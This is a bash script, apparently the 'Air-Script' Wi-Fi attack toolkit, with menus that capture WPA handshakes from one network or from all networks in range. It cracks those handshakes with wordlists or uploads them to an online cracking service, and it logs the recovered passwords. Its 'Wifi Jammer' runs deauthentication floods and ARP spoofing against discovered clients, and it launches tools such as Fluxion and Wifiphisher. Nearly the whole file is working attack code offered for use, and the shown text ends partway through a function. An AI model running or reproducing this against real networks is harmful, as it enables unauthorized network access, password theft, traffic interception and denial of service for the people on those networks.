#!/bin/bash

# Ensure we are being ran as root
if [ "$(id -u)" -ne 0 ]; then
	echo "This script must be ran as root"
	exit 1
fi

SCRIPT_PATH="$(readlink -f "${BASH_SOURCE[0]}")"
SCRIPT_DIR="$(cd "$(dirname "$SCRIPT_PATH")" && pwd)"
HANDSHAKE_DIR="$SCRIPT_DIR/handshakes"
TOOLS_DIR="$SCRIPT_DIR/tools"
LOG_DIR="$SCRIPT_DIR/logs"
PASSWORD_LOG="$LOG_DIR/password"
WORDLIST_DIR="$SCRIPT_DIR/wordlist"
SYSTEM_WORDLIST_DIR="/opt/airscript/wordlist"
SYSTEM_WORDLIST_DIR_ALT="/opt/airscript/wordlists"
# Default priority: system wordlist first, then alt, then local copy
if [ -f "$SYSTEM_WORDLIST_DIR/wordlist.txt" ]; then
    DEFAULT_WORDLIST="$SYSTEM_WORDLIST_DIR/wordlist.txt"
elif [ -f "$SYSTEM_WORDLIST_DIR_ALT/wordlist.txt" ]; then
    DEFAULT_WORDLIST="$SYSTEM_WORDLIST_DIR_ALT/wordlist.txt"
else
    DEFAULT_WORDLIST="$WORDLIST_DIR/wordlist.txt"
fi
base_interface=""
monitor_interface=""
MAX_HANDSHAKE_ATTEMPTS=5
CLIENTS=()

enter_tool_dir() {
    local path="$1"
    if [ ! -d "$path" ]; then
        echo "Tool path not found: $path"
        return 1
    fi
    cd "$path" || return 1
}
network () {
echo "Please, select a network interface:"
cd /sys/class/net && select foo in *; do echo $foo selected $foo; base_interface="$foo"; break; done
airmon-ng start "$base_interface" > /dev/null 2>&1
echo "Please, select the interface in monitor mode:"
cd /sys/class/net && select foo in *; do echo $foo selected $foo; monitor_interface="$foo"; break; done
foo="$monitor_interface"
cd "$SCRIPT_DIR"
}
sudo postfix start > /dev/null 2>&1
sudo systemctl start postfix > /dev/null 2>&1
clear
Red="\e[1;91m"      ##### Colors Used #####
Green="\e[0;92m"
Yellow="\e[0;93m"
Blue="\e[1;94m"
White="\e[0;97m"

handshakeWait=2        ##### Time, how long aircack-ng waits for handshake in minute #####

checkDependencies () {        ##### Check if aircrack-ng is installed or not #####
if [ $(dpkg-query -W -f='${Status}' aircrack-ng 2>/dev/null | grep -c "ok installed") -eq 0 ]; then
echo "Installing aircrack-ng\n\n"
apt-get install -y aircrack-ng;
fi
}

checkWiFiStatus () {        ##### Check if $foo is enabled or not #####
WiFiStatus=`nmcli radio wifi`
if [ "$WiFiStatus" == "disabled" ]; then
nmcli radio wifi on
echo -e "[${Green}$foo${White}] Enabled!"
fi
#stopMon > /dev/null 2>&1
checkServices > /dev/null 2>&1


}


checkServices () {
sudo systemctl restart postfix > /dev/null 2>&1
sudo postfix restart > /dev/null 2>&1
sudo systemctl restart postfix > /dev/null 2>&1
sudo systemctl start postfix > /dev/null 2>&1
sudo postfix start > /dev/null 2>&1
sudo systemctl start postfix > /dev/null 2>&1



}
banner () {        ##### Banner #####
    echo -e "${Red}                    __   __   __   __     __  ___    "
    echo -e "${Red}             /\  | |__) /__\` /  \` |__) | |__)  |     "
    echo -e "${Red}            /~~\\ | |  \\ .__/ \\__, |  \\ | |     |     "

    #echo -e "${Yellow} \n                     Hack the world!!!     "
    echo -e "${Green}\n   [Version: 2.1.0 Stable] Developed by: Liam Bendix"
  
}
menu () {        ##### Display available options in two columns #####
    echo -e "\n${Yellow}               [ Select Option To Continue ]\n\n"
    
    # First column
    echo -e "      ${Red}[${Blue}1${Red}] ${Green}Hack Wifi             ${Red}[${Blue}6${Red}] ${Green}View log file"
    echo -e "      ${Red}[${Blue}2${Red}] ${Green}Decrypt Password(s)   ${Red}[${Blue}7${Red}] ${Green}Extra Tools"
    echo -e "      ${Red}[${Blue}3${Red}] ${Green}Wifi Jammer           ${Red}[${Blue}8${Red}] ${Green}Help"
    echo -e "      ${Red}[${Blue}4${Red}] ${Green}Change MAC Address    ${Red}[${Blue}9${Red}] ${Green}Exit"
    echo -e "      ${Red}[${Blue}5${Red}] ${Green}Change IP Address\n"
    
    while true; do
        echo -e "${Green}┌─[${Red}Select Option${Green}]──[${Red}~${Green}]─[${Yellow}Menu${Green}]:"
        read -p "└─────►$(tput setaf 7) " option
        case $option in
  1) echo -e "\n[${Green}Selected${White}] Option 1 Hack A Wifi Network.."
     wifiHacking
     ;;
  2) echo -e "\n[${Green}Selected${White}] Option 2 Decrypt Password(s).."
     crack
     return
     ;;
  3) echo -e "\n[${Green}Selected${White}] Option 3 Wifi Jammer..."
     wifiJammer
     return
     ;;
  4) echo -e "\n[${Green}Selected${White}] Option 4 Changing MAC Address..."
     macChange
     return
     ;;
  5) echo -e "\n[${Green}Selected${White}] Option 5 Anonsurf..."
     anonsurf
     return
     ;;
  6) echo -e "\n[${Green}Selected${White}] Option 6 View log of cracked networks..."
     log
     return
     ;;
  7) echo -e "\n[${Green}Selected${White}] Option 7 Extra Tools..."
     tools
     return
     ;;
  8) echo -e "\n[${Green}Selected${White}] Option 8 Help..."
     Help
     return
     ;;
  9) echo -e "${Red}\n\033[1mThank You for using the script,\nHappy Hacking :)\n"
     exit 0
               ;;
            *) echo -e "${White}[${Red}Error${White}] Please select correct option...\n"
               ;;
        esac
    done
}
wifiHacking () {        ##### Sending DeAuth and capture handshake #####
        ##### Display available options #####
echo -e "\n${Yellow}                      [ Select Option To Continue ]\n\n"
echo -e "      ${Red}[${Blue}1${Red}] ${Green}Air-Script Attacks"
echo -e "      ${Red}[${Blue}2${Red}] ${Green}Fluxion Attacks"
echo -e "      ${Red}[${Blue}3${Red}] ${Green}Wifite Attacks"
echo -e "      ${Red}[${Blue}4${Red}] ${Green}Wifite2 Attacks"
echo -e "      ${Red}[${Blue}5${Red}] ${Green}Wifiphisher Attacks"
echo -e "      ${Red}[${Blue}6${Red}] ${Green}Fern Attacks"
echo -e "      ${Red}[${Blue}7${Red}] ${Green}Airogeddon Attacks"
echo -e "      ${Red}[${Blue}8${Red}] ${Green}Exit\n\n"
while true; do
echo -e "${Green}┌─[${Red}Select Option${Green}]──[${Red}~${Green}]─[${Yellow}Menu${Green}]:"
read -p "└─────►$(tput setaf 7) " option
case $option in
  1) echo -e "\n[${Green}Selected${White}] Option 1 Air Script Attacks.."
     AirScriptMenu
     ;;
  2) echo -e "\n[${Green}Selected${White}] Option 2 Fluxion.."
     FluxionMenu
     return
     ;;
  3) echo -e "\n[${Green}Selected${White}] Option 3 Wifite.."
     Wifite
     return
     ;;
  4) echo -e "\n[${Green}Selected${White}] Option 4 Wifite2.."
     Wifite2
     return
     ;;
  5) echo -e "\n[${Green}Selected${White}] Option 5 Wifiphisher.."
     StartWifiphisher
     return
     ;;
  6) echo -e "\n[${Green}Selected${White}] Option 6 Fern.."
     Fern
     return
     ;;
  7) echo -e "\n[${Green}Selected${White}] Option 7 Airgeddon.."
     airogeddon
     return
     ;;
  8) echo -e "${Red}\n\033[1mThank You for using the script,\nHappy Hacking :)\n"
     exit 0
     ;;
  *) echo -e "${White}[${Red}Error${White}] Please select correct option...\n"
     ;;
esac
done
}


 AirScriptMenu() {        ##### Sending DeAuth and capture handshake #####
        ##### Display available options #####
echo -e "\n${Yellow}                      [ Select Option To Continue ]\n\n"
echo -e "      ${Red}[${Blue}1${Red}] ${Green}Hack A Network"
echo -e "      ${Red}[${Blue}2${Red}] ${Green}Hack All Networks"
echo -e "      ${Red}[${Blue}3${Red}] ${Green}PMKID Attacks"
echo -e "      ${Red}[${Blue}4${Red}] ${Green}Exit\n\n"
while true; do
echo -e "${Green}┌─[${Red}Select Option${Green}]──[${Red}~${Green}]─[${Yellow}Menu${Green}]:"
read -p "└─────►$(tput setaf 7) " option
case $option in
  1) echo -e "\n[${Green}Selected${White}] Option 1 Hack A Network.."
     AirScript
     ;;
  2) echo -e "\n[${Green}Selected${White}] Option 2 Hack All Networks.."
     attackAll
     return
     ;;
  3) echo -e "\n[${Green}Selected${White}] Option 3 PMKID Attack.."
     pmkid_all
     return
     ;;
  4) echo -e "${Red}\n\033[1mThank You for using the script,\nHappy Hacking :)\n"
     exit 0
     ;;
  *) echo -e "${White}[${Red}Error${White}] Please select correct option...\n"
     ;;
esac
done
}



AirScript() {
notification
}


notification () {
while true; do
    read -p "Do you want to recive email notifications when it's done pwning?" yn
    case $yn in
        [Yy]* ) attackYes; break;;
        [Nn]* ) attackNo; break;;
        * ) echo "Please answer yes or no.";;
    esac
done
}


attackYes () {
echo "Enter your email address for notifications: " email
read email
echo "Remember to check your spam folder!"
sleep 3
network
monitor
deauthAttack
sleep 3
pkill -9 xterm
if [ -n "$email" ]; then
    echo "Handshakes have been captured!" | mail -s "Networks Pwned!" "$email"
fi
#crack
}


attackNo () {
    network
    monitor
deauthAttack
pkill -9 xterm
#crack
}

wordlist () {        ##### Enter path to wordlist or use default #####
    ensure_wordlist_dir
    while true; do
        fileLocation=$(select_wordlist) && return 0
        echo -e "[${Red}!$White] File doesn't exist... please try again."
    done

}









notification1 () {
while true; do
    read -p "Do you want to recive email notifications when it's done pwning?" yn
    case $yn in
        [Yy]* ) attackAllYes; break;;
        [Nn]* ) attackAllNo; break;;
        * ) echo "Please answer yes or no.";;
    esac
done
}


attackAll() {
notification1
}


attackAllYes() {
    echo "Enter your email address for notifications: "
    read email
    sleep 3
    echo "Remember to check your spam folder!"
    network
    clear
  
    # Run Besside-ng to capture handshakes from all Wi-Fi networks in range
    echo -e "${Green}Starting Besside-ng to capture WPA handshakes from all networks in range..."
    besside-ng $foo

    # Once Besside-ng completes (or captures a handshake), it will stop and output results
    echo -e "${Green}Handshakes capture complete. Saved in ~/handshakes/"
    stopMon 
    if [ -n "$email" ]; then
        echo "Handshakes have been captured!" | mail -s "Networks Pwned!" "$email"
    fi
				crack 
}



attackAllNo () {
    network
    # Run Besside-ng to capture handshakes from all Wi-Fi networks in range
    echo -e "${Green}Starting Besside-ng to capture WPA handshakes from all networks in range..."
    besside-ng $foo

    # Once Besside-ng completes (or captures a handshake), it will stop and output results
    echo -e "${Green}Handshakes capture complete. Saved in ~/handshakes/"
    stopMon 
    crack
}

ensure_log_dirs() {
    mkdir -p "$LOG_DIR"
    touch "$PASSWORD_LOG"
}

ensure_wordlist_dir() {
    mkdir -p "$WORDLIST_DIR"
    # If local wordlist.txt is missing but a system default exists, expose it via symlink for clarity
    if [ ! -f "$WORDLIST_DIR/wordlist.txt" ] && [ -f "$DEFAULT_WORDLIST" ] && [ "$DEFAULT_WORDLIST" != "$WORDLIST_DIR/wordlist.txt" ]; then
        ln -sf "$DEFAULT_WORDLIST" "$WORDLIST_DIR/wordlist.txt"
    fi
}

select_wordlist() {
    ensure_wordlist_dir
    # Helper to list wordlists with a "(none)" placeholder
    list_dir() {
        local dir="$1"
        echo "Available wordlists in $dir:" >&2
        if [ -d "$dir" ]; then
            local output
            output=$(cd "$dir" 2>/dev/null && ls -1)
            if [ -n "$output" ]; then
                printf '%s\n' "$output" >&2
            else
                echo "(none)" >&2
            fi
        else
            echo "(dir not found)" >&2
        fi
    }

    # Show available wordlists (system first)
    list_dir "$SYSTEM_WORDLIST_DIR"
    list_dir "$SYSTEM_WORDLIST_DIR_ALT"
    list_dir "$WORDLIST_DIR"

    read -p "Type a wordlist filename from above or any path (default: $DEFAULT_WORDLIST): " user_wordlist
    user_wordlist="$(printf '%s' "$user_wordlist" | sed 's/^ *//;s/ *$//')"

    # Use defaults when the user hits enter
    if [ -z "$user_wordlist" ]; then
        user_wordlist="$DEFAULT_WORDLIST"
    fi

    # Resolve relative paths against known wordlist directories
    if [ -n "$user_wordlist" ] && [ ! -f "$user_wordlist" ]; then
        if [ -f "$WORDLIST_DIR/$user_wordlist" ]; then
            user_wordlist="$WORDLIST_DIR/$user_wordlist"
        elif [ -f "$SYSTEM_WORDLIST_DIR/$user_wordlist" ]; then
            user_wordlist="$SYSTEM_WORDLIST_DIR/$user_wordlist"
        elif [ -f "$SYSTEM_WORDLIST_DIR_ALT/$user_wordlist" ]; then
            user_wordlist="$SYSTEM_WORDLIST_DIR_ALT/$user_wordlist"
        fi
    fi

    if [ -z "$user_wordlist" ] || [ ! -f "$user_wordlist" ]; then
        echo "Wordlist not found: $user_wordlist"
        return 1
    fi

    printf '%s\n' "$user_wordlist"
}

extract_ssid_from_cap() {
    local cap_file="$1"
    local ssid=""

    # Try tshark first
    if command -v tshark >/dev/null 2>&1; then
        ssid=$(tshark -r "$cap_file" -Y "wlan_mgt.ssid" -T fields -e wlan_mgt.ssid 2>/dev/null | head -n 1)
    fi

    # Fallback: parse aircrack-ng table output to recover ESSID
    if [ -z "$ssid" ] && command -v aircrack-ng >/dev/null 2>&1; then
        local tmp_wordlist
        tmp_wordlist=$(mktemp) || true
        echo "dummy" > "$tmp_wordlist"
        ssid=$(
            aircrack-ng -a2 -w "$tmp_wordlist" "$cap_file" 2>/dev/null | \
            awk '
                /^[[:space:]]*[0-9]+[[:space:]]+[0-9A-Fa-f:]{17}/ {
                    essid=""
                    # ESSID is between BSSID and the encryption columns; gather middle fields.
                    for (i = 3; i <= NF-2; i++) {
                        essid = essid $i (i < NF-2 ? " " : "")
                    }
                    gsub(/^[ \t]+|[ \t]+$/, "", essid)
                    if (length(essid) > 0) {
                        print essid
                        exit
                    }
                }
            '
        )
        rm -f "$tmp_wordlist"
    fi

    if [ -z "$ssid" ] && [ -n "$targetName" ]; then
        ssid="$targetName"
    fi

    if [ -z "$ssid" ]; then
        ssid=$(basename "$cap_file")
    fi

    echo "$ssid"
}

log_cracked_password() {
    local ssid="$1"
    local password="$2"
    local timestamp

    ensure_log_dirs
    timestamp=$(date +"%Y-%m-%d %H:%M:%S")
    echo "$timestamp | SSID: $ssid | Password: $password" >> "$PASSWORD_LOG"
    echo -e "\e[32m[Saved]\e[0m Stored credentials for $ssid in $PASSWORD_LOG"
}

crack_caps_locally() {
    echo "You have selected local cracking."
    ensure_wordlist_dir
    echo "Your wordlist directory: $WORDLIST_DIR"
    local wordlist
    while true; do
        wordlist=$(select_wordlist) && break
        echo "Please enter a valid wordlist path."
    done

    for cap_file in *.cap; do
        [ -f "$cap_file" ] || continue
        echo "Cracking $cap_file ..."
        local temp_output password_found ssid found_file
        temp_output=$(mktemp)
        found_file=$(mktemp)

        # Use aircrack-ng's -l flag to write the recovered key to a file to avoid parsing errors
        sudo aircrack-ng -w "$wordlist" -l "$found_file" "$cap_file" | tee "$temp_output"

        if [ -s "$found_file" ]; then
            password_found=$(head -n 1 "$found_file")
        else
            # Fallback to parsing stdout if -l did not produce a file
            password_found=$(awk -F'[][]' '/KEY FOUND!/{gsub(/^[ \t]+|[ \t]+$/, "", $2); print $2}' "$temp_output" | tail -n 1)
        fi

        if [ -n "$password_found" ]; then
            ssid=$(extract_ssid_from_cap "$cap_file")
            log_cracked_password "$ssid" "$password_found"
        else
            echo "No password recovered for $cap_file"
        fi
        rm -f "$temp_output" "$found_file"
    done

    cleanup_handshakes
    exit
}

validate_target() {
    # Trim whitespace from BSSID and channel
    bssid=$(echo "$bssid" | tr -d '[:space:]')
    channel=$(echo "$channel" | tr -d '[:space:]')

    if ! [[ "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
        echo -e "\e[31m[Error]\e[0m Invalid BSSID: '$bssid'"
        return 1
    fi

    if ! [[ "$channel" =~ ^[0-9]+$ ]]; then
        echo -e "\e[31m[Error]\e[0m Invalid channel: '$channel'"
        return 1
    fi

    if [ -z "$foo" ]; then
        echo -e "\e[31m[Error]\e[0m Monitor interface not set."
        return 1
    fi

    return 0
}


crack () {
checkServices
	stopMon
sleep 2
    if [ -n "$email" ]; then
        echo "Handshakes have been captured!" | mail -s "Networks Pwned!" "$email" > /dev/null 2>&1
    fi
    # Check if there are any .cap files in the current directory
    if ! ls *.cap &>/dev/null; then
        mkdir -p "$HANDSHAKE_DIR"
        # If no .cap files found, change to handshakes directory without output
        cd "$HANDSHAKE_DIR" &>/dev/null
    fi
				
    crack_hashes
}


crack_hashes() {
    echo "Do you want to crack hashes from your device or from the web?"
    select method in "Local (Device)" "Upload (WPA-Sec)"; do
        case $method in
            "Local (Device)")
                crack_caps_locally
                ;;
            "Upload (WPA-Sec)")
                # Ask for the user's email for cracking (optional, based on the site)
                echo "Please provide your email for WPA-Sec service:"
                read -p "Email: " user_email

                if [[ -z "$user_email" ]]; then
                    echo "Email cannot be empty. Exiting."
                    exit 1
                fi

                # Ask for the path to the .cap file
                echo "Please provide the path to your .cap file:"
                echo "Your current directory:"
                pwd
                ls *.cap
                read -p "Path to .cap file: " cap_file

                # Check if the file exists
                if [[ ! -f "$cap_file" ]]; then
                    echo "File not found. Exiting."
                    exit 1
                fi

                # Ensure user agrees to terms and conditions (optional, based on the site)
                echo "Please agree to the Terms & Conditions by typing 'yes':"
                read agreement

                if [[ "$agreement" != "yes" ]]; then
                    echo "You must agree to the terms to continue. Exiting."
                    exit 1
                fi

                    script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
                    key_file="$script_dir/key.txt"

                if [[ ! -f "$key_file" ]]; then
                    echo "key.txt file not found. Exiting."
                    exit 1
                fi

                # Get the key from key.txt using the correct path
                key=$(cat "$key_file")

                # Check if the key is empty
                if [[ -z "$key" ]]; then
                    echo "Key in key.txt is empty. Exiting."
                    exit 1
                fi

                # Upload to WPA-Sec
                echo "Uploading $cap_file to WPA-Sec..."
                response=$(curl --progress-bar -X POST "https://wpa-sec.stanev.org/?submit" \
                -F "email=$user_email" \
                -F "file=@$cap_file" \
                -F "key=$key" \
                -F "submit=Submit")
                # Output the response status code and body for debugging
                echo "Response: $response" 
                echo "This capture is legacy but will still work..."
                echo "Handshakes have been successfully submitted. If a password is found you will receive an email."

                # Check the response to determine if submission was successful
                if [[ "$response" == *"Cracking started"* ]]; then
                    echo "Cracking request submitted successfully."
                else
                    echo "Error submitting your request. Please try again. Response: $response"
                    exit 1
                fi
                break
                ;;
            *)
                echo "Invalid option. Please select either 'Local' or 'Upload'."
                ;;
        esac
    done
}

cleanup () {
    sudo rm -f *.csv > /dev/null 2>&1
    sudo rm -f *.netxml > /dev/null 2>&1
    sudo rm -f airodump_output.log > /dev/null 2>&1
    sudo rm -f *.ivs > /dev/null 2>&1
    sudo rm -f *.hc22000 > /dev/null 2>&1
    sudo rm -f essidlist > /dev/null 2>&1
    cleanup_handshakes
    if ls *pcapng >/dev/null 2>&1; then
        mkdir -p "$HANDSHAKE_DIR"
        sudo mv *pcapng "$HANDSHAKE_DIR" > /dev/null 2>&1
    fi
}


cleanup_handshakes() {
    # Ensure handshakes directory exists
    if [ ! -d "$HANDSHAKE_DIR" ]; then
        echo "Creating handshakes directory..."
        mkdir -p "$HANDSHAKE_DIR"
    fi

    echo "Renaming and moving .cap files to handshakes folder..."
    cd "$SCRIPT_DIR" || { echo "Failed to change directory to $SCRIPT_DIR"; exit 1; }

    for cap_file in *.cap; do
        if [ -f "$cap_file" ]; then
            timestamp=$(date +"%Y-%m-%d_%H-%M-%S")
            new_file="$HANDSHAKE_DIR/${timestamp}_$(basename "$cap_file")"
            mv "$cap_file" "$new_file"
        fi
    done

    echo "Cleanup complete. All .cap files renamed and moved to handshakes."
}






FluxionMenu() {
enter_tool_dir "$TOOLS_DIR/fluxion" || return
sudo ./fluxion.sh
}

Wifite () {
sudo wifite
}

Wifite2 () {
wifite
enter_tool_dir "$TOOLS_DIR/wifite2" || return
sudo ./Wifite.py
}


StartWifiphisher () {
wifiphisher

}

Fern () {
sudo fern-wifi-cracker
}


airogeddon () {
enter_tool_dir "$TOOLS_DIR/airgeddon" || return
sudo bash airgeddon.sh
}


################## WIFI JAMMER ####################################









# Function: List network interfaces and allow selection
select_interface() {
    echo "Available network interfaces:"
    interfaces=($(ls /sys/class/net))
    select interface in "${interfaces[@]}"; do
        if [[ -n "$interface" ]]; then
            echo "Selected interface: $interface"
            break
        else
            echo "Invalid selection. Try again."
        fi
    done
}

# Function: Scan for clients on the current network using arp-scan
scan_clients() {
    echo "Scanning current network for connected devices..."

    # Perform an ARP scan with retries and save results
    retries=3
    for i in $(seq 1 "$retries"); do
        echo "ARP Scan Attempt $i of $retries..."
        sudo arp-scan --localnet --interface="$interface" --retry=5 >> arp_scan_results_raw.txt
        sleep 1
    done

    # Clean up and remove duplicates from the results
    sort -u -o arp_scan_results_raw.txt arp_scan_results_raw.txt

    # Extract IP, MAC, and vendor information
    awk '/[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/ {print $1, $2, $3}' arp_scan_results_raw.txt > arp_scan_results.txt

    # Display the results
    echo -e "\nDetected Clients:"
    echo "------------------------------------------------------------"
    echo "No.  IP Address      MAC Address         Vendor/Device Name"
    echo "------------------------------------------------------------"
    awk '{printf "%-3d %-15s %-17s %-20s\n", NR, $1, $2, $3}' arp_scan_results.txt

    # Count total clients
    total_clients=$(wc -l < arp_scan_results.txt)
    if [ "$total_clients" -eq 0 ]; then
        echo "No clients found. Retrying with nmap for more details..."
        
        # Fallback: Use nmap to detect devices
        gateway_ip=$(ip route | awk '/default/ {print $3}')
        subnet=$(echo "$gateway_ip" | awk -F. '{print $1"."$2"."$3".0/24"}')
        sudo nmap -sn "$subnet" | awk '/Nmap scan report/{ip=$NF}/MAC Address/{print ip, $3, $4, $5, $6}' >> arp_scan_results.txt

        total_clients=$(wc -l < arp_scan_results.txt)
        if [ "$total_clients" -eq 0 ]; then
            echo "No clients found after retrying. Exiting."
            exit 1
        fi
    fi
}

# Function: Allow user to select target clients
select_clients() {
    echo -e "\nSelect clients to target:"
    echo "1) Single client"
    echo "2) Multiple clients"
    echo "3) All clients"
    read -p "Enter your choice (1/2/3): " choice

    case $choice in
        1)
            read -p "Enter the client number to target: " target_num
            target_mac=$(awk -v num="$target_num" '/[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/ {if (NR == num) print $2}' arp_scan_results.txt)
            targets=("$target_mac")
            ;;
        2)
            echo "Enter the client numbers to target (separated by spaces):"
            read -a target_nums
            targets=()
            for num in "${target_nums[@]}"; do
                mac=$(awk -v num="$num" '/[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/ {if (NR == num) print $2}' arp_scan_results.txt)
                targets+=("$mac")
            done
            ;;
        3)
            targets=($(awk '/[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/ {print $2}' arp_scan_results.txt))
            ;;
        *)
            echo "Invalid choice. Exiting."
            exit 1
            ;;
    esac
}

# Function: Auto-detect BSSID and channel
auto_detect_bssid_channel() {
    echo "Auto-detecting BSSID and channel of the connected network..."
    bssid=$(iw dev "$interface" link | awk '/Connected/ {print $3}')
    channel=$(iw dev "$interface" info | awk '/channel/ {print $2}')

    if [[ -z "$bssid" || -z "$channel" ]]; then
        echo "Failed to detect BSSID or channel. Ensure you're connected to a network."
        exit 1
    fi

    echo "Detected BSSID: $bssid"
    echo "Detected Channel: $channel"
}

# Function: Perform ARP spoofing attack
arp_spoof() {
    echo "Starting ARP spoofing attack..."
    for mac in "${targets[@]}"; do
        echo "Spoofing client: $mac"
        sudo arpspoof -i "$interface" -t "$mac" "$gateway_ip" &
    done
    echo "ARP spoofing attack in progress. Press Ctrl+C to stop."
    wait
}

# Function: Perform DeAuth attack
deauth_attack() {
    echo "Starting DeAuth attack..."
    for mac in "${targets[@]}"; do
        echo "Deauthenticating client: $mac"
        aireplay-ng --deauth 1000 -a "$bssid" -c "$mac" "$monitor_interface"
    done
    echo "DeAuth attack complete."
}

# Main Script Logic
wifiJammer() {
    echo "Wi-Fi Jammer"
    echo "------------"
    echo "1) Target Current Network"
    echo "2) Target Another Network"
    read -p "Choose an option (1/2): " network_choice

    if [ "$network_choice" -eq 2 ]; then
        echo "Feature to target another network is not implemented yet."
        return
    fi

    echo "Available attack methods:"
    echo "1) ARP Spoofing"
    echo "2) DeAuth Attack"
    read -p "Choose an attack method (1/2): " attack_method

    # Select interface for ARP scan
    select_interface

    # Scan for clients
    scan_clients

    # Select target clients
    select_clients

    if [ "$attack_method" -eq 1 ]; then
        echo "Performing ARP Spoofing Attack..."
        read -p "Enter the gateway IP for ARP spoofing: " gateway_ip
        arp_spoof
    elif [ "$attack_method" -eq 2 ]; then
        echo "Performing DeAuth Attack..."
        # Auto-detect BSSID and channel
        auto_detect_bssid_channel

        # Enable monitor mode
        echo "Enabling monitor mode on $interface..."
        airmon-ng start "$interface"
        monitor_interface="${interface}mon"

        # Perform DeAuth attack
        deauth_attack

        # Disable monitor mode after the attack
        echo "Disabling monitor mode on $monitor_interface..."
        airmon-ng stop "$monitor_interface"
    else
        echo "Invalid attack method selected. Exiting."
        exit 1
    fi
}











##############################################################################


# Function to capture MAC addresses and process them
captureMAC() {
  # Ensure the script is running with root privileges
  if [ "$(id -u)" -ne 0 ]; then
    echo "This script must be run as root"
    return 1
  fi

  # Parse input arguments
  while getopts "c:b:f:" opt; do
    case "$opt" in
      c) channel="$OPTARG" ;;
      b) bssid="$OPTARG" ;;
      f) foo="$OPTARG" ;;
      *) echo "Usage: $0 -c <channel> -b <BSSID> -f <interface>"; return 1 ;;
    esac
  done

  # Validate input parameters
  if [ -z "$channel" ] || [ -z "$bssid" ] || [ -z "$foo" ]; then
    echo "Usage: $0 -c <channel> -b <BSSID> -f <interface>"
    return 1
  fi

  # Check if the provided interface is already in monitor mode
  if ! iw dev "$foo" info | grep -q "type monitor"; then
    echo "$foo is not in monitor mode. Please make sure the interface is in monitor mode."
    return 1
  fi

  # Create a temporary capture file to store output
  capture_file="capture_$bssid"

  # Start airodump-ng with timeout handling
  echo "Capturing data on channel $channel for AP $bssid using interface $foo..."

  # Print the interface status for debugging
  iw dev "$foo" info

  # Start airodump-ng in the background and capture its process ID
  airodump-ng --channel "$channel" --bssid "$bssid" --write "$capture_file" "$foo" > airodump_output.log 2>&1 &
  airodump_pid=$!

  # Wait for 30 seconds before killing the process
  sleep 30

  # Check if airodump-ng is still running, and kill it if necessary
  if kill -0 $airodump_pid 2>/dev/null; then
    echo "Timeout reached. Killing airodump-ng process..."
    kill $airodump_pid
  else
    echo "airodump-ng process already completed."
  fi

  # Wait for airodump-ng to terminate (if not already terminated)
  wait $airodump_pid

  # Check if airodump-ng successfully created a capture file
  if [ ! -f "${capture_file}-01.csv" ]; then
    echo "Failed to capture any data or the capture file does not exist."
    echo "Check the log file airodump_output.log for errors."
    return 1
  fi

  # Extract the MAC addresses of connected clients and stations
  echo "Extracting client and station MAC addresses associated with BSSID $bssid..."

  # Extract station MAC addresses using grep and awk (station list from CSV file)
  echo "Station MAC addresses:"
  awk -F, -v bssid="$bssid" '$1 == bssid {print $1}' "${capture_file}-01.csv" | grep -oE '([[:xdigit:]]{2}:){5}[[:xdigit:]]{2}' | sort | uniq

  # Extract associated client MAC addresses using grep and awk (client list from CSV file)
  echo "Client MAC addresses:"
  awk -F, -v bssid="$bssid" '$1 == bssid {print $1}' "${capture_file}-01.csv" | grep -oE '([[:xdigit:]]{2}:){5}[[:xdigit:]]{2}' | sort | uniq | while read client; do
    echo "Client MAC: $client"
  done

  # Clean up capture files
 # rm -f "${capture_file}"*

  echo "Script completed successfully. Monitor mode was not disabled."
}

# Example usage of the captureMAC function
# You would call the function with the correct parameters like this:
# captureMAC -c 11 -b 94:6A:77:2D:2A:6E -f wlan0

# Example usage of the captureMAC function
# You would call the function with the correct parameters like this:
# captureMAC -c 6 -b XX:XX:XX:XX:XX:XX -f wlan0




monitor() {
    airmon-ng check kill

    if [ -z "$base_interface" ]; then
        base_interface="$foo"
    fi

    if ! iwconfig "$foo" > /dev/null 2>&1; then
        echo "Interface $foo not found. Please check your device."
        exit 1
    fi

    if iw dev "$foo" info 2>/dev/null | grep -q "type monitor"; then
        echo -e "\e[32m[$foo already in monitor mode]\e[0m"
        monitor_interface="$foo"
    else
        echo -e "\e[32m[Starting monitor mode on $foo...]\e[0m"
        if ! airmon-ng start "$foo" > /dev/null 2>&1; then
            echo -e "\e[31mFailed to start monitor mode on $foo. Please check your device.\e[0m"
            exit 1
        fi
        if iw dev "${foo}mon" info >/dev/null 2>&1; then
            monitor_interface="${foo}mon"
        else
            monitor_interface="$foo"
        fi
    fi

    foo="$monitor_interface"
    trap "command -v airmon-ng >/dev/null 2>&1 && airmon-ng stop \"$monitor_interface\" > /dev/null 2>&1; rm -f generated-01.csv handshake-01.cap 2> /dev/null" EXIT

    echo "Starting airodump-ng scan on $foo..."
    airodump-ng --output-format csv --write generated "$foo" > /dev/null &
    airodump_pid=$!
    sleep 20

    if ps -p $airodump_pid > /dev/null; then
        echo "Killing airodump-ng process..."
        kill $airodump_pid
    else
        echo "airodump-ng process already stopped."
    fi

    if [ ! -f "generated-01.csv" ]; then
        echo "Error: generated-01.csv not found. Is airodump-ng running correctly?"
        exit 1
    fi

    echo -e "\n\n${Red}CSV Raw Data (First 5 lines)${White}:"
    head -n 5 generated-01.csv

    # Build the network list from the access point section (skip station rows).
    # Use manual BSSID validation to avoid mawk regex crashes seen with some patterns.
    mapfile -t network_rows < <(
        awk -F',' '
            NR == 1 { next }
            NF >= 14 {
                gsub(/^[ \t]+|[ \t]+$/, "", $1)
                gsub(/^[ \t]+|[ \t]+$/, "", $4)
                gsub(/^[ \t]+|[ \t]+$/, "", $14)

                # Validate BSSID: expect 6 hex pairs separated by colons.
                n = split($1, parts, ":")
                if (n != 6) {
                    next
                }
                valid = 1
                for (i = 1; i <= n; i++) {
                    if (length(parts[i]) != 2 || parts[i] !~ /^[0-9A-Fa-f][0-9A-Fa-f]$/) {
                        valid = 0
                        break
                    }
                }
                if (valid) {
                    print $1","$4","$14
                }
            }
        ' generated-01.csv
    )

    total_networks=${#network_rows[@]}
    if [ "$total_networks" -eq 0 ]; then
        echo "No networks found. Please check if airodump-ng is running correctly."
        exit 1
    fi

    echo -e "\n\n${Red}Available Networks${White}"
